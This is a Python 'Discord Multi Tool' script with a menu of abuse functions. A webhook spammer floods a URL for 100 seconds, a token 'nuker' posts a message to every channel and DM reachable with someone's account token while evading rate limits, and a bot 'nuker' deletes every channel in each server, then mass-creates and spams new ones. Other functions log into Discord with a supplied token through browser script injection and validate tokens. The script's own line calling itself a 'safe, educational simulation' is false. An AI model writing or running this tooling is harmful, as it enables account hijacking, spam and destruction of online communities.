import sys
import os
import time
import requests
import random
import webbrowser
import base64
import string
try:
    from selenium import webdriver
except ImportError:
    webdriver = None

def startup_animation():
    import sys
    import time
    RED = "\033[91m"
    RESET = "\033[0m"
    bar_length = 30
    loading_text = "Starting Discord Multi Tool..."
    print(RED + loading_text + RESET)
    for i in range(bar_length + 1):
        percent = int((i / bar_length) * 100)
        bar = "█" * i + "-" * (bar_length - i)
        sys.stdout.write(f"\r{RED}[{bar}]{RESET} {percent}%")
        sys.stdout.flush()
        time.sleep(0.04)
    sys.stdout.write("\n")
    sys.stdout.flush()
    sys.stdout.write("\033[F\033[K")
    sys.stdout.write("\033[F\033[K")
    sys.stdout.flush()

def print_banner():
    RED = "\033[91m"
    RESET = "\033[0m"
    print(RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⢀⣴⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣷⣄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⢀⣴⣧⣄⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠿⣿⣿⣿⣿⣷⣄⠀
⢴⣿⣿⣿⣿⣶⣀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠉⠿⣿⣿⣿⣿⡷
⠀⠀⠙⠿⣿⣿⣿⣿⣶⣄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠉⠻⡿⠋⠀
⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠘⢻⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⢉⣿⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢿⡿⠋⠀⠀⠀⠀⢀⣴⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + RESET)
    print(RED + "Created BY Proxy" + RESET)
    print(RED + "Version 1.0" + RESET)
    print("")

def menu():
    RED = "\033[91m"
    RESET = "\033[0m"
    print(RED + "[DISCORD]" + RESET)
    print(f"{RED}[01]{RESET} - Discord Webhook Spammer")
    print(f"{RED}[02]{RESET} - Delete a Discord Webhook")
    print(f"{RED}[03]{RESET} - Discord Webhook Info")
    print(f"{RED}[04]{RESET} - Discord Token Login")
    print(f"{RED}[05]{RESET} - Discord Token Nuker")
    print(f"{RED}[06]{RESET} - Discord Token Generator")
    print(f"{RED}[07]{RESET} - Discord Token Info")
    print(f"{RED}[08]{RESET} - Discord bot nuker")
    print(f"{RED}[00]{RESET} - Exit")

def token_nuker_real():
    token = input("Enter the Discord token: ")
    message = input("Enter the message to send: ")
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    guilds = []
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
        if r.status_code == 200:
            guilds = r.json()
        else:
            print(f"Error retrieving guilds: {r.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    for guild in guilds:
        guild_id = guild.get('id')
        try:
            r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
            if r.status_code == 200:
                channels = r.json()
                for channel in channels:
                    if channel.get('type') == 0: 
                        channel_id = channel.get('id')
                        data = {"content": message}
                        try:
                            send = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=data)
                            if send.status_code in [200, 201, 204]:
                                print(f"Message sent in {channel.get('name')} ({guild.get('name')})")
                            elif send.status_code == 429:
                                retry = send.json().get('retry_after', 2)
                                print(f"Rate limit! Waiting {retry} seconds...")
                                time.sleep(float(retry) + random.uniform(0.5, 1.5))
                                continue
                            else:
                                print(f"Error sending in {channel.get('name')}: {send.status_code}")
                        except Exception as e:
                            print(f"Error sending message: {e}")
                        time.sleep(random.uniform(1.0, 2.5))
            else:
                print(f"Error retrieving channels: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
        if r.status_code == 200:
            dms = r.json()
            for dm in dms:
                if dm.get('type') == 1: 
                    channel_id = dm.get('id')
                    data = {"content": message}
                    try:
                        send = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=data)
                        if send.status_code in [200, 201, 204]:
                            print(f"Message sent in DM to {dm.get('recipients')[0].get('username')}")
                        elif send.status_code == 429:
                            retry = send.json().get('retry_after', 2)
                            print(f"Rate limit! Waiting {retry} seconds...")
                            time.sleep(float(retry) + random.uniform(0.5, 1.5))
                            continue
                        else:
                            print(f"Error sending DM: {send.status_code}")
                    except Exception as e:
                        print(f"Error sending DM: {e}")
                    time.sleep(random.uniform(1.0, 2.5))
        else:
            print(f"Error retrieving DMs: {r.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    print("Operation completed.")

def token_joiner():
    print("Opening pages in the default browser...")
    webbrowser.open('https://discord.com/login')
    webbrowser.open('https://chromewebstore.google.com/detail/discord-token-login/dgejhipdiojpnoggmehdiicanhnbdngk')
    print("""
1. Wait for the pages to open in your browser.
2. Install the "Discord Token Login" extension from the Chrome Web Store.
3. Follow the extension instructions to use it with your token.

Press ENTER to return to the main menu...
""")
    input()
    clear_screen()

def token_login_selenium():
    if webdriver is None:
        print("Error: 'selenium' module not installed. Run 'pip install selenium'.")
        return

    token = input("Enter the Discord token: ")

    print(f"""
 01 - Chrome (Requires chromedriver)
 02 - Edge (Requires edgedriver) [Windows Only]
 03 - Firefox (Requires geckodriver) [Windows Only]
    """)
    browser_choice = input(f"Choose Browser -> ")

    driver = None
    navigator = ""

    try:
        if browser_choice in ['1', '01']:
            navigator = "Chrome"
            print(f"Starting {navigator}...")
            driver = webdriver.Chrome()
        elif browser_choice in ['2', '02']:
            if sys.platform.startswith("win"):
                navigator = "Edge"
                print(f"Starting {navigator}.. Friendly Reminder: This option is Windows only.")
                driver = webdriver.Edge()
            else:
                print("Edge is only supported on Windows for this function, as specified in the original code.")
                return
        elif browser_choice in ['3', '03']:
            if sys.platform.startswith("win"):
                navigator = "Firefox"
                print(f"Starting {navigator}.. Friendly Reminder: This option is Windows only.")
                driver = webdriver.Firefox()
            else:
                print("Firefox is only supported on Windows for this function, as specified in the original code.")
                return
        else:
            print("Invalid browser choice.")
            return

        print(f"{navigator} ready.")

        script = """
function login(token) {
    setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${token}\"`;
    }, 50);
    setTimeout(() => {
        location.reload();
    }, 2500);
}
"""

        driver.get("https://discord.com/login")
        print(f"Attempting token login...")
        driver.execute_script(script + f'\nlogin("{token}")')
        time.sleep(5)

        print(f"Process completed. Check the {navigator} window to see the result.")
        print(f"Automatic login may not have occurred due to Discord's countermeasures (P2).")
        print(f"When leaving the tool, the browser window may close.")

    except Exception as e:
        print(f"Error during browser automation: {e}")
        print(f"Make sure {navigator} is installed and the driver ({navigator.lower()}driver) is in the PATH and up to date.")

def simulate_action(action):
    if action == "Token Nuker":
        token_nuker_real()
    elif action == "Token Joiner":
        token_joiner()
    elif action == "Token Login":
        token_login_selenium()
    else:
        print(f"\nSimulating: {action}")
        print("No real Discord API calls are made. This is a safe, educational simulation.\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def simulate_webhook_spammer():
    webhook_url = input("Enter the Discord Webhook URL: ")
    message = input("Enter the message to send: ")
    print("Sending messages for 100 seconds as fast as possible...")
    end_time = time.time() + 100
    count = 0
    while time.time() < end_time:
        data = {"content": message}
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204 or response.status_code == 200:
                print(f"Message sent successfully! ({count+1})")
            else:
                print(f"Error sending message. Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        count += 1
    print(f"Sending finished. Messages sent: {count}")

def delete_webhook():
    webhook_url = input("Enter the Discord Webhook URL to delete: ")
    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            print("Webhook deleted successfully!")
        else:
            print(f"Error deleting webhook. Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    for i in range(3, 0, -1):
        print(f"Returning to main menu in {i}...", end="\r", flush=True)
        time.sleep(1)
    clear_screen()

def discord_bot_nuker():
    import json
    import time
    import threading
    bot_token = input("Enter the Discord bot token: ")
    message = input("Enter the message to send in the channels: ")
    new_channel_name = input("Name of the new channels: ")
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://discord.com, v1)"
    }
    def spam_messages(channel_id):
        msg_payload = {"content": message}
        for _ in range(5):
            msg_resp = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", headers=headers, json=msg_payload)
            if msg_resp.status_code in [200, 201, 204]:
                print(f"Message sent in {new_channel_name}")
            elif msg_resp.status_code == 429:
                retry = msg_resp.json().get('retry_after', 2)
                print(f"Rate limit! Waiting {retry} seconds...")
                time.sleep(float(retry))
            else:
                print(f"Error sending message: {msg_resp.status_code}")
    try:
        guilds_resp = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
        if guilds_resp.status_code != 200:
            print(f"Error retrieving guilds: {guilds_resp.status_code}")
            return
        guilds = guilds_resp.json()
    except Exception as e:
        print(f"Error: {e}")
        return
    for guild in guilds:
        guild_id = guild.get('id')
        try:
            channels_resp = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers)
            if channels_resp.status_code != 200:
                print(f"Error retrieving channels for guild {guild.get('name', guild_id)}: {channels_resp.status_code}")
                continue
            channels = channels_resp.json()
            for channel in channels:
                ch_id = channel.get('id')
                del_resp = requests.delete(f"https://discord.com/api/v10/channels/{ch_id}", headers=headers)
                if del_resp.status_code in [200, 204]:
                    print(f"Channel deleted: {channel.get('name')}")
                elif del_resp.status_code == 429:
                    retry = del_resp.json().get('retry_after', 2)
                    print(f"Rate limit! Waiting {retry} seconds...")
                    time.sleep(float(retry))
                else:
                    print(f"Error deleting channel {channel.get('name')}: {del_resp.status_code}")
            print("Starting channel and message spam for 100 seconds...")
            end_time = time.time() + 100
            threads = []
            while time.time() < end_time:
                payload = {"name": new_channel_name, "type": 0}
                create_resp = requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)
                if create_resp.status_code == 201:
                    new_channel = create_resp.json()
                    ch_id = new_channel.get('id')
                    t = threading.Thread(target=spam_messages, args=(ch_id,))
                    t.start()
                    threads.append(t)
                elif create_resp.status_code == 429:
                    retry = create_resp.json().get('retry_after', 2)
                    print(f"Rate limit! Waiting {retry} seconds...")
                    time.sleep(float(retry))
                else:
                    print(f"Error creating channel: {create_resp.status_code}")
            for t in threads:
                t.join()
        except Exception as e:
            print(f"Error: {e}")
    print("Operation completed.")
    input("Press ENTER to return to the main menu...")
    clear_screen()

def loading_animation(message="Loading", duration=1.5):
    import sys
    import time
    spinner = ['|', '/', '-', '\\']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{message} {spinner[i % len(spinner)]}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(message) + 2) + "\r")
    sys.stdout.flush()

def discord_token_generator():
    import base64
    import os
    import random
    print("\n--- Discord Token Generator ---")
    count = input("How many tokens do you want to generate? (default 1): ")
    try:
        count = int(count)
    except:
        count = 1
    for _ in range(count):
        user_id = str(random.randint(10**17, 10**18-1))
        user_id_b64 = base64.b64encode(user_id.encode()).decode().rstrip('=')
        part2_bytes = os.urandom(5)[:4] + os.urandom(1)[:1]
        part2_b64 = base64.urlsafe_b64encode(part2_bytes).decode().replace('=', '')[:6]
        part3_bytes = os.urandom(20)
        part3_b64 = base64.urlsafe_b64encode(part3_bytes).decode().replace('=', '')[:27]
        token = f"{user_id_b64}.{part2_b64}.{part3_b64}"
        print(token)
    input("Press ENTER to return to the main menu...")
    clear_screen()

def discord_token_info():
    print("\n--- Discord Token Info ---")
    token = input("Enter the Discord token to check: ")
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if resp.status_code == 200:
            user = resp.json()
            print(f"Token is valid! User: {user.get('username')}#{user.get('discriminator')} (ID: {user.get('id')})")
        elif resp.status_code == 401:
            print("Token is invalid or expired.")
        else:
            print(f"Token check failed. Status: {resp.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    input("Press ENTER to return to the main menu...")
    clear_screen()

def discord_webhook_info():
    print("\n--- Discord Webhook Info ---")
    url = input("Enter the Discord Webhook URL: ")
    try:
        resp = requests.get(url)
        if resp.status_code == 200:
            data = resp.json()
            print(f"ID         : {data.get('id')}")
            print(f"Token      : {data.get('token')}")
            print(f"Name       : {data.get('name')}")
            print(f"Avatar     : {data.get('avatar') if data.get('avatar') else 'None'}")
            print(f"Type       : {'bot' if data.get('type') == 1 else 'unknown'}")
            print(f"Channel ID : {data.get('channel_id')}")
            print(f"Server ID  : {data.get('guild_id')}")
        elif resp.status_code == 404:
            print("Webhook not found or invalid URL.")
        else:
            print(f"Failed to get webhook info. Status: {resp.status_code}")
    except Exception as e:
        print(f"Error: {e}")
    input("Press ENTER to return to the main menu...")
    clear_screen()

def main():
    RED = "\033[91m"
    RESET = "\033[0m"
    startup_animation()
    print_banner()
    while True:
        menu()
        choice = input(RED + "Select an option: " + RESET)
        clear_screen()
        print_banner()
        if choice == "01":
            loading_animation("Starting Webhook Spammer")
            simulate_webhook_spammer()
            clear_screen()
            print_banner()
        elif choice == "02":
            loading_animation("Starting Webhook Deletion")
            delete_webhook()
            clear_screen()
            print_banner()
        elif choice == "03":
            loading_animation("Starting Webhook Info")
            discord_webhook_info()
            clear_screen()
            print_banner()
        elif choice == "04":
            loading_animation("Starting Token Login")
            simulate_action("Token Joiner")
            clear_screen()
            print_banner()
        elif choice == "05":
            loading_animation("Starting Token Nuker")
            simulate_action("Token Nuker")
            clear_screen()
            print_banner()
        elif choice == "06":
            loading_animation("Starting Token Generator")
            discord_token_generator()
            clear_screen()
            print_banner()
        elif choice == "07":
            loading_animation("Starting Token Info")
            discord_token_info()
            clear_screen()
            print_banner()
        elif choice == "08":
            loading_animation("Starting Bot Nuker")
            discord_bot_nuker()
            clear_screen()
            print_banner()
        elif choice == "00":
            print("Exiting simulation.")
            break
        else:
            print("Invalid option. Please select a valid menu item.")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()